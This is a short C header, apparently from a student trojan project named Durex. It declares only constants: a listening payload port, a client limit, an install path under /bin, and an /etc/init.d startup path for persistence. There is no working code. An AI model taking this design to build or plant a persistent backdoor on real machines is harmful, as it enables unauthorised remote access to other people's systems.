#ifndef DUREX_H

# define DUREX_H

# include <unistd.h>
# include <stdlib.h>
# include <arpa/inet.h>
# include <netdb.h>
# include <netinet/in.h>
# include <netinet/ip_icmp.h>
# include <sys/param.h>
# include <sys/socket.h>
# include <sys/stat.h>
# include <sys/time.h>
# include <sys/types.h>
# include <stdio.h>
# include <fcntl.h>
# include "libft.h"

# define PAYLOAD_PORT 4242
# define MAX_CLIENTS 3
# define PAYLOAD_PATH "/bin/Durex"
# define INIT_PATH "/etc/init.d/Durex"
# define TROJAN_STR "ndombre / justasze"

#endif
